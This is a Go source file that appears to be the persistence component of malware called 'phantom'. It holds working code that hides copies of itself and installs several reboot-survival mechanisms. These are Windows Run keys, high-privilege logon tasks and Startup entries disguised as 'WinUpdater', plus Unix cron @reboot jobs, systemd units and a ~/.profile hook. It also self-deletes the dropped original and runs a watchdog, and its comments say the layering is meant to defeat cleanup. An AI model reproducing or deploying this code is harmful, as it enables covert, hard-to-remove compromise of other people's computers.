package main

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"strings"
)

// persist installs reboot survival. Several independent mechanisms are stacked
// on purpose - one registry value is easy to find and delete, three quiet ones
// are not. sub = auto|systemd|cron|registry|task|startup|remove
func persist(sub string) Result {
	if sub == "remove" {
		return persistRemove()
	}
	exe, err := os.Executable()
	if err != nil {
		return Result{OK: false, Err: err.Error()}
	}
	if runtime.GOOS == "windows" {
		return persistWindows(exe, sub)
	}
	return persistUnix(exe, sub)
}

// freeCloakPath returns a cloaked location the implant is not currently running
// from. A running image cannot be opened for writing on Windows, so a second
// copy gets a numbered sibling instead of a failed overwrite.
func freeCloakPath() string {
	self, _ := os.Executable()
	base := cloakPath()
	ext := filepath.Ext(base)
	stem := strings.TrimSuffix(base, ext)
	for i := 0; i < 8; i++ {
		cand := base
		if i > 0 {
			cand = fmt.Sprintf("%s_%d%s", stem, i, ext)
		}
		if strings.EqualFold(cand, self) {
			continue
		}
		f, err := os.OpenFile(cand, os.O_WRONLY, 0)
		if err == nil {
			f.Close()
			return cand
		}
		if os.IsNotExist(err) {
			return cand
		}
	}
	return base
}

// ---------------- windows ----------------

func persistWindows(exe, sub string) Result {
	dst := freeCloakPath()
	if err := os.MkdirAll(filepath.Dir(dst), 0755); err != nil {
		return Result{OK: false, Err: err.Error()}
	}
	if err := copyFile(exe, dst); err != nil {
		return Result{OK: false, Err: "copy: " + err.Error()}
	}
	hideFile(dst)

	// masquerade as a routine vendor updater
	name := strings.TrimSuffix(filepath.Base(dst), filepath.Ext(dst))
	if name == "" || name == "phantom" {
		name = "WinUpdater"
	}

	var log strings.Builder
	run := func(label string, args ...string) {
		out, err := newCmd(args[0], args[1:]...).CombinedOutput()
		if err != nil {
			fmt.Fprintf(&log, "[x] %s: %v %s\n", label, err, strings.TrimSpace(string(out)))
			return
		}
		fmt.Fprintf(&log, "[+] %s\n", label)
	}

	if sub == "" || sub == "auto" || sub == "registry" {
		run("registry Run key", "reg", "add",
			`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
			"/v", name, "/t", "REG_SZ", "/d", dst, "/f")
	}
	if sub == "" || sub == "auto" || sub == "task" {
		run("scheduled task (logon)", "schtasks", "/create", "/f",
			"/tn", name+"Update", "/tr", dst, "/sc", "onlogon", "/rl", "highest")
	}
	if sub == "" || sub == "auto" || sub == "startup" {
		startup := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows",
			"Start Menu", "Programs", "Startup")
		if err := os.MkdirAll(startup, 0755); err == nil {
			if err := copyFile(dst, filepath.Join(startup, name+".exe")); err == nil {
				log.WriteString("[+] startup folder\n")
			}
		}
	}

	// the persisted copy owns the foothold now: get the dropped one off disk
	if self, err := os.Executable(); err == nil && !strings.EqualFold(self, dst) {
		hideFile(self)
		if scheduleSelfDelete(self) {
			log.WriteString("[+] original removed on next boot\n")
		}
	}
	go ensureWatchdog()
	if log.Len() == 0 {
		log.WriteString("no method succeeded")
	}
	return Result{OK: true, Out: "cloaked copy: " + dst + "\n" + log.String()}
}

func persistRemove() Result {
	if runtime.GOOS == "windows" {
		base := cloakPath()
		name := strings.TrimSuffix(filepath.Base(base), filepath.Ext(base))
		newCmd("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
			"/v", name, "/f").Run()
		newCmd("schtasks", "/delete", "/f", "/tn", name+"Update").Run()
		// remove every cloaked sibling the implant ever planted
		if matches, err := filepath.Glob(strings.TrimSuffix(base, filepath.Ext(base)) + "*" +
			filepath.Ext(base)); err == nil {
			for _, m := range matches {
				newCmd("attrib", "-h", "-s", m).Run()
				os.Remove(m)
			}
		}
		os.Remove(filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows",
			"Start Menu", "Programs", "Startup", name+".exe"))
		return Result{OK: true, Out: "run key, task, startup entry and cloaked copies removed"}
	}
	dst := cloakPath()
	newCmd("systemctl", "disable", "--now", "phantom.service").Run()
	newCmd("sh", "-c", "crontab -l 2>/dev/null | grep -v "+dst+" | crontab -").Run()
	os.Remove(dst)
	return Result{OK: true, Out: "systemd unit, cron entry and " + dst + " removed"}
}

// ---------------- unix ----------------

func persistUnix(exe, sub string) Result {
	root := os.Getuid() == 0
	var dst string
	if root {
		dst = "/usr/local/bin/.phantom"
	} else {
		home, _ := os.UserHomeDir()
		dst = filepath.Join(home, ".local", "bin", ".phantom")
		os.MkdirAll(filepath.Dir(dst), 0755)
	}
	if err := copyFile(exe, dst); err != nil {
		return Result{OK: false, Err: "copy: " + err.Error()}
	}
	os.Chmod(dst, 0755)
	go ensureWatchdog()

	var log strings.Builder
	if sub == "" || sub == "auto" || sub == "cron" || !root {
		if r := persistCron(dst); r.OK {
			log.WriteString("[+] " + r.Out + "\n")
		} else {
			log.WriteString("[x] cron: " + r.Err + "\n")
		}
	}
	if sub == "" || sub == "auto" || sub == "systemd" {
		if r := persistSystemd(dst, root); r.OK {
			log.WriteString("[+] " + r.Out + "\n")
		} else {
			log.WriteString("[x] systemd: " + r.Err + "\n")
		}
	}
	// a profile hook survives cleaning out of cron/systemd
	if !root {
		home, _ := os.UserHomeDir()
		rc := filepath.Join(home, ".profile")
		line := fmt.Sprintf(`[ -x %s ] && (pgrep -f %s >/dev/null || setsid %s >/dev/null 2>&1 &)`,
			dst, dst, dst)
		if b, err := os.ReadFile(rc); err == nil && !strings.Contains(string(b), dst) {
			if f, err := os.OpenFile(rc, os.O_APPEND|os.O_WRONLY, 0644); err == nil {
				f.WriteString("\n" + line + "\n")
				f.Close()
				log.WriteString("[+] ~/.profile hook\n")
			}
		}
	}
	return Result{OK: true, Out: "copy: " + dst + "\n" + log.String()}
}

func persistCron(dst string) Result {
	line := "@reboot " + dst + " >/dev/null 2>&1"
	out, err := newCmd("sh", "-c",
		fmt.Sprintf("(crontab -l 2>/dev/null | grep -v %s; echo '%s') | crontab -",
			dst, line)).CombinedOutput()
	if err != nil {
		return Result{OK: false, Out: string(out), Err: err.Error()}
	}
	return Result{OK: true, Out: "cron @reboot -> " + dst}
}

func persistSystemd(dst string, root bool) Result {
	unit := fmt.Sprintf(`[Unit]
Description=Phantom agent
After=network-online.target

[Service]
ExecStart=%s
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
`, dst)
	args := []string{"systemctl"}
	if !root {
		args = append(args, "--user")
	}
	if root {
		if err := os.WriteFile("/etc/systemd/system/phantom.service", []byte(unit), 0644); err != nil {
			return Result{OK: false, Err: err.Error()}
		}
	} else {
		home, _ := os.UserHomeDir()
		dir := filepath.Join(home, ".config", "systemd", "user")
		os.MkdirAll(dir, 0755)
		if err := os.WriteFile(filepath.Join(dir, "phantom.service"), []byte(unit), 0644); err != nil {
			return Result{OK: false, Err: err.Error()}
		}
	}
	newCmd(args[0], append(args[1:], "daemon-reload")...).Run()
	out, err := newCmd(args[0], append(args[1:], "enable", "--now", "phantom.service")...).CombinedOutput()
	if err != nil {
		return Result{OK: false, Out: string(out), Err: err.Error()}
	}
	return Result{OK: true, Out: "systemd unit enabled -> " + dst}
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	tmp := dst + ".new"
	out, err := os.OpenFile(tmp, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0755)
	if err != nil {
		return writeInPlace(in, dst)
	}
	if _, err := io.Copy(out, in); err != nil {
		out.Close()
		return err
	}
	out.Close()
	if err := os.Rename(tmp, dst); err == nil {
		return nil
	}
	// the target is a running image and cannot be replaced: overwrite it
	os.Remove(tmp)
	if _, err := in.Seek(0, io.SeekStart); err != nil {
		return err
	}
	return writeInPlace(in, dst)
}

func writeInPlace(in *os.File, dst string) error {
	out, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0755)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}
